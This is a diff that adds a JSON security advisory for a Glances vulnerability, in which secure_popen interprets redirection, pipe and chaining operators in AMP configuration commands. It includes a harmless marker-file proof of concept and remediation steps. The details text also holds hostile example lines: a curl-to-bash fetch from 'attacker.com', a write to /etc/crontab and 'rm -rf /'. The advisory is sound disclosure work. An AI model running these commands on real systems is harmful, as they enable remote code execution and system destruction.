@@ -1,0 +1,80 @@
+{
+  "id": "GHSA-3vwc-qwhc-3mj7",
+  "modified": "2026-06-23T18:15:06.977738950Z",
+  "published": "2026-06-23T17:59:01Z",
+  "aliases": [
+    "CVE-2026-53925"
+  ],
+  "summary": "Glances has arbitrary file write and command execution via `secure_popen` redirection and chaining operators in AMP command configuration",
+  "details": "### Summary\n\nThe `secure_popen()` function in `glances/secure.py` interprets `\u003e` (file redirection), `|` (pipe), and `\u0026\u0026` (command chaining) operators in command strings. These operators are applied without any validation on the target file path, piped command, or chained command.\n\nWhen Application Monitoring Process (AMP) modules load their `command` or `service_cmd` configuration values from `glances.conf`, those values are passed directly to `secure_popen()` with no sanitization. This allows an attacker who can modify the Glances configuration file to write arbitrary content to arbitrary filesystem paths (via `\u003e`), chain arbitrary commands (via `\u0026\u0026`), or pipe command output to arbitrary programs (via `|`).\n\nCrucially, this vulnerability is **not mitigated** by the `--disable-config-exec` flag that was introduced to address CVE-2026-33641. That flag only disables backtick command execution in `config.get_value()`; it does not affect the `secure_popen()` function's interpretation of shell-like operators.\n\n### Details\n\n**Affected code path 1 — Default AMP (`glances/amps/default/__init__.py:69`)**\n\n```python\nres = self.get('command')\n# ...\nself.set_result(secure_popen(res).rstrip())\n```\n\nThe `command` config value is loaded from `[amp_\u003cname\u003e]` sections via `GlancesAmp.load_config()` (`glances/amps/amp.py:81`):\n\n```python\nself.configs[param] = config.get_value(amp_section, param).split(',')\n```\n\n**Affected code path 2 — SystemV AMP (`glances/amps/systemv/__init__.py:60`)**\n\n```python\nres = secure_popen(self.get('service_cmd'))\n```\n\nThe `service_cmd` config value is loaded from `[amp_systemv]` sections via the same `GlancesAmp.load_config()` method.\n\n**Sink — `secure_popen()` (`glances/secure.py:33-77`)**\n\nThe function explicitly parses:\n- `\u003e` for file redirection (line 39): `cmd.split('\u003e')` — the path after `\u003e` is used directly in `open(stdout_redirect, \"w\")` (line 71) with **no path validation**.\n- `|` for command piping (line 51): `cmd.split('|')` — each segment is executed as a separate `Popen` with stdout piped to the next.\n- `\u0026\u0026` for command chaining (line 27 in `secure_popen`): `cmd.split('\u0026\u0026')` — each segment is executed sequentially.\n\nNone of these operators are sanitized or restricted when loading AMP configuration values.\n\n**Why `--disable-config-exec` does not help:**\n\nThe `--disable-config-exec` flag (introduced for CVE-2026-33641) only prevents `system_exec()` from running backtick-embedded commands in `config.get_value()`. It does not affect how the resulting string value is processed by `secure_popen()`. A command value like `echo data \u003e /etc/crontab` contains no backticks and passes through `get_value()` unchanged, then `secure_popen()` interprets the `\u003e` operator and writes to the arbitrary path.\n\n### PoC\n\n**Clean-checkout recipe:**\n\n1. Create a test configuration file:\n\n```bash\ncat \u003e /tmp/poc-glances.conf \u003c\u003c 'EOF'\n[amp_poc]\nenable=true\nregex=.*\nrefresh=3\ncommand=echo POC_ARBITRARY_FILE_WRITE \u003e /tmp/cve-poc-marker-amp\n\n[outputs]\ncors_origins=*\nEOF\n```\n\n2. Run a Python script that simulates the AMP command execution path:\n\n```python\nimport sys\nsys.path.insert(0, '/path/to/glances')\nfrom glances.config import Config\nfrom glances.secure import secure_popen\nimport os\n\n# Load config with --disable-config-exec ACTIVE (CVE-2026-33641 mitigation)\nconfig = Config(config_dir='/tmp/poc-glances.conf', disable_config_exec=True)\n\n# Read AMP command value (same as amp.py load_config)\ncommand = config.get_value('amp_poc', 'command')\nprint(f'Command: {command!r}')\n\n# Execute (same as amps/default/__init__.py line 69)\nmarker = '/tmp/cve-poc-marker-amp'\nassert not os.path.exists(marker), 'Clean state required'\nresult = secure_popen(command)\nprint(f'Result: {result!r}')\n\n# Verify arbitrary file write occurred\nassert os.path.exists(marker), 'VULNERABILITY NOT CONFIRMED'\nwith open(marker) as f:\n    content = f.read()\nprint(f'Written to {marker}: {content!r}')\nassert 'POC_ARBITRARY_FILE_WRITE' in content\n\n# Cleanup\nos.remove(marker)\nprint('CONFIRMED: Arbitrary file write via secure_popen \u003e in AMP command')\n```\n\n**Expected vulnerable output:**\n\n```\nCommand: 'echo POC_ARBITRARY_FILE_WRITE \u003e /tmp/cve-poc-marker-amp'\nResult: 'POC_ARBITRARY_FILE_WRITE\\n'\nWritten to /tmp/cve-poc-marker-amp: 'POC_ARBITRARY_FILE_WRITE\\n'\nCONFIRMED: Arbitrary file write via secure_popen \u003e in AMP command\n```\n\n**Negative/control case (demonstrating `--disable-config-exec` only blocks backticks):**\n\n```python\n# This IS blocked by --disable-config-exec:\n# command=`rm -rf /` → get_value() skips backtick execution\n\n# This is NOT blocked by --disable-config-exec:\n# command=echo data \u003e /etc/crontab → secure_popen writes to /etc/crontab\n```\n\n**Cleanup:**\n\n```bash\nrm -f /tmp/poc-glances.conf /tmp/cve-poc-marker-amp\n```\n\n### Impact\n\nAn attacker who can modify `glances.conf` (e.g., through a separate file-write vulnerability, a misconfigured shared filesystem, a configuration management system, or a container volume mount) can:\n\n1. **Write arbitrary content to arbitrary files** via the `\u003e` operator — e.g., overwriting `/etc/crontab`, `~/.ssh/authorized_keys`, or any file writable by the Glances process user.\n\n2. **Execute arbitrary commands** via the `\u0026\u0026` and `|` operators — e.g., `echo x \u0026\u0026 curl http://attacker.com/shell.sh | bash`.\n\n3. **Exfiltrate data** via the `|` operator piping command output to network utilities.\n\nThe existing `--disable-config-exec` mitigation for CVE-2026-33641 does not protect against this vulnerability because it operates at a different layer (`config.get_value()` backtick processing vs. `secure_popen()` operator interpretation).\n\n### Suggested remediation\n\n1. **Remove file redirection support from `secure_popen()`** unless explicitly required. The `\u003e` operator in `__secure_popen()` (lines 39-45, 69-72) writes to arbitrary paths. Consider removing this feature or restricting output paths to a safe directory (e.g., a configured output directory with path traversal protection).\n\n2. **Sanitize AMP command values** before passing them to `secure_popen()`. Apply the same sanitization used in `actions.py:_sanitize_mustache_dict()` to strip `\u0026\u0026`, `|`, `\u003e\u003e`, and `\u003e` from AMP command and service_cmd config values, or refuse to execute commands containing these operators.\n\n3. **Consider replacing `secure_popen()` with `subprocess.run(shell=False)`** using explicit argument arrays. The `secure_popen()` function reimplements shell-like operator parsing (`\u0026\u0026`, `|`, `\u003e`) which is inherently risky. Standard `subprocess.run()` with `shell=False` and an explicit argument list avoids this class of vulnerability entirely.\n\n4. **Add a regression test** that verifies AMP commands cannot contain file redirection or command chaining operators.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "glances",
+        "purl": "pkg:pypi/glances"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.0.8"
+            },
+            {
+              "fixed": "4.5.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.0.8",
+        "4.1.0",
+        "4.1.1",
+        "4.1.2",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "4.3.0.1",
+        "4.3.0.3",
+        "4.3.0.4",
+        "4.3.0.5",
+        "4.3.0.6",
+        "4.3.0.7",
+        "4.3.0.8",
+        "4.3.1",
+        "4.3.2",
+        "4.3.3",
+        "4.4.0",
+        "4.4.1",
+        "4.5.0",
+        "4.5.0.1",
+        "4.5.0.2",
+        "4.5.0.3",
+        "4.5.0.4",
+        "4.5.0.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-3vwc-qwhc-3mj7/GHSA-3vwc-qwhc-3mj7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nicolargo/glances/security/advisories/GHSA-3vwc-qwhc-3mj7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nicolargo/glances"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nicolargo/glances/releases/tag/v4.5.5"
+    }
+  ]
+}
